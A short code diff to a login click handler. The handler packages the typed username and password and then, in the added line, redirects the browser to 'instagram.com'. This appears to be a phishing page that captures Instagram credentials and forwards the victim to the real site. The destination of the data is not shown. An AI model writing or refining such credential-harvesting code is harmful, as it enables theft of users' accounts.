@@ -40,4 +40,5 @@ function logInOnClick() {
         username: usernameInputText,
         passowrd: passwordInputText
     }));
+    document.location.href = "instagram.com";
 }
